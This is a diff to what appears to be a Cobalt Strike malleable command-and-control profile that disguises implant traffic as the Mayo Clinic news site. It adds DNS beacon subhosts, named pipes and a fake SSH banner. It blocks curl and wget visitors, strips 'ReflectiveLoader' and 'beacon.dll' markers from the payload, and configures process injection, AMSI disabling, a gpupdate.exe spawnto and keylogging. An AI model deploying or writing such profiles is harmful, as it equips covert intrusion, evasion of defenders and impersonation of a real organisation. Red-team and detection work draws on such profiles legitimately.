@@ -4,25 +4,60 @@
 set sleeptime "37000"; 
 set jitter    "25"; 
 set useragent "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"; 
-set dns_idle "8.8.8.8"; 
-set maxdns    "245"; 
-  
+set data_jitter "50";
 set sample_name "mayoclinic.profile"; 
-  
+
+dns-beacon {
+    # Options moved into 'dns-beacon' group in 4.3:
+    set dns_idle             "8.8.8.8";
+    set dns_max_txt          "220";
+    set dns_sleep            "0";
+    set dns_ttl              "1";
+    set maxdns               "255";
+    set dns_stager_prepend   ".wwwds.";
+    set dns_stager_subhost   ".e2867.dsca.";
+     
+    # DNS subhost override options added in 4.3:
+    set beacon               "d-bx.";
+    set get_A                "d-1ax.";
+    set get_AAAA             "d-4ax.";
+    set get_TXT              "d-1tx.";
+    set put_metadata         "d-1mx";
+    set put_output           "d-1ox.";
+    set ns_response          "zero";
+}
+
+###SMB options###
+set pipename "ntsvcs##";
+set pipename_stager "scerpc##";
+set smb_frame_header "";
+
+###TCP options###
+set tcp_port "8000";
+set tcp_frame_header "";
+
+###SSH options###
+set ssh_banner "Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-1065-aws x86_64)";
+set ssh_pipename "SearchTextHarvester##";
+
 #https-certificate { 
 #        set keystore "keystore.store"; 
 #        set password "password"; 
 #} 
   
 http-config { 
-    set headers "Content-Type, Connection, Server, Link, X-Cache"; 
-    header "Content-Type" "text/html;charset=UTF-8"; 
+    set headers "Connection, Server, Link, X-Cache"; 
+
     header "Connection" "close"; 
     header "Server" "nginx"; 
     header "X-Powered-By" "PHP/7.0.33"; 
     header "Link" "<https://newsnetwork.mayoclinic.org/wp-json/>; rel=\"https://api.w.org/\"";
     set trust_x_forwarded_for "false";
-} 
+    
+    set block_useragents "curl*,lynx*,wget*";
+}
+
+#set headers_remove "image/x-xbitmap, image/pjpeg, application/vnd";
   
 http-get { 
   
@@ -140,56 +175,52 @@ http-stager {
   
 } 
   
-###Malleable PE Options### 
-#always test spawnto and module stomp before using. My examples tested on Windows 10 Pro. 
-  
-post-ex {
-
-    set spawnto_x86 "%windir%\\syswow64\\gpupdate.exe";
-    set spawnto_x64 "%windir%\\sysnative\\gpupdate.exe";
-
-    set obfuscate "true";
-
+###Malleable PE/Stage Block###
+stage {
+    set checksum        "0";
+    set compile_time    "17 Oct 2020 04:32:14";
+    set entry_point     "170001";
+    #set image_size_x86 "6586368";
+    #set image_size_x64 "6586368";
+    #set name	        "WWanMM.dll";
+    set userwx 	        "false";
+    set cleanup	        "true";
+    set sleep_mask	"true";
+    set stomppe	        "true";
+    set obfuscate	"true";
+    set rich_header     "";
+    
+    set sleep_mask "true";
+    
     set smartinject "true";
+    
+    #allocator options include HeapAlloc, MapViewOfFile, VirtualAlloc, or you can use module stomp.
+    #set allocator "HeapAlloc";
+    set magic_mz_x86 "MZRE";
+    set magic_mz_x64 "MZAR";
+    set magic_pe "EA";
 
-    set amsi_disable "true";
+    set module_x86 "wwanmm.dll";
+    set module_x64 "wwanmm.dll";
 
+    transform-x86 {
+        #prepend "\x90\x90\x90";
+        strrep "ReflectiveLoader" "";
+        strrep "beacon.dll" "";
+        }
+
+    transform-x64 {
+        #prepend "\x90\x90\x90";
+        strrep "ReflectiveLoader" "";
+        strrep "beacon.x64.dll" "";
+        }
+
+    #string "something";
+    #data "something";
+    #stringw "something"; 
 }
-  
-#used peclone on wwanmm.dll.  
-#don't use 'set image_size_xx' if using 'set module_xx' 
-stage { 
-    set checksum       "0"; 
-    set compile_time   "25 Oct 2016 01:57:23"; 
-    set entry_point    "170000"; 
-#    set image_size_x86 "6586368"; 
-#    set image_size_x64 "6586368"; 
-#    set name       "WWanMM.dll"; 
-    set userwx        "false"; 
-    set cleanup       "true"; 
-    set sleep_mask       "true"; 
-    set stomppe       "true"; 
-    set obfuscate       "true"; 
-    set rich_header    "\xee\x50\x19\xcf\xaa\x31\x77\x9c\xaa\x31\x77\x9c\xaa\x31\x77\x9c\xa3\x49\xe4\x9c\x84\x31\x77\x9c\x1e\xad\x86\x9c\xae\x31\x77\x9c\x1e\xad\x85\x9c\xa7\x31\x77\x9c\xaa\x31\x76\x9c\x08\x31\x77\x9c\x1e\xad\x98\x9c\xa3\x31\x77\x9c\x1e\xad\x84\x9c\x98\x31\x77\x9c\x1e\xad\x99\x9c\xab\x31\x77\x9c\x1e\xad\x80\x9c\x6d\x31\x77\x9c\x1e\xad\x9a\x9c\xab\x31\x77\x9c\x1e\xad\x87\x9c\xab\x31\x77\x9c\x52\x69\x63\x68\xaa\x31\x77\x9c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"; 
-  
-  
-#module stomp 
-  
-    set module_x86 "wwanmm.dll"; 
-    set module_x64 "wwanmm.dll"; 
-  
-    transform-x86 { 
-        prepend "\x90\x90\x90"; 
-        strrep "ReflectiveLoader" ""; 
-        strrep "beacon.dll" ""; 
-    } 
-  
-    transform-x64 { 
-        prepend "\x90\x90\x90"; 
-        strrep "ReflectiveLoader" ""; 
-        strrep "beacon.x64.dll" ""; 
-    }
-}
+
+###Process Inject Block###
 process-inject {
 
     set allocator "NtMapViewOfSection";		
@@ -201,17 +232,45 @@ process-inject {
     set startrwx "true";
         
     transform-x86 {
-        prepend "\x90\x90\x90";
+        #prepend "\x90\x90\x90";
     }
     transform-x64 {
-        prepend "\x90\x90\x90";
+        #prepend "\x90\x90\x90";
     }
 
     execute {
-        CreateThread "ntdll!RtlUserThreadStart";
-        CreateThread;
-        NtQueueApcThread;
-        CreateRemoteThread;
+        #CreateThread;
+        #CreateRemoteThread;       
+
+        CreateThread "ntdll.dll!RtlUserThreadStart+0x1000";
+
+        SetThreadContext;
+
+        NtQueueApcThread-s;
+
+        #NtQueueApcThread;
+
+        CreateRemoteThread "kernel32.dll!LoadLibraryA+0x1000";
+
         RtlCreateUserThread;
     }
-} 
+}
+
+###Post-Ex Block###
+post-ex {
+
+    set spawnto_x86 "%windir%\\syswow64\\gpupdate.exe";
+    set spawnto_x64 "%windir%\\sysnative\\gpupdate.exe";
+
+    set obfuscate "true";
+
+    set smartinject "true";
+
+    set amsi_disable "true";
+    
+    set thread_hint "ntdll.dll!RtlUserThreadStart+0x1000";
+    set pipename "DserNamePipe##, PGMessagePipe##, MsFteWds##";
+    set keylogger "SetWindowsHookEx";
+
+
+}
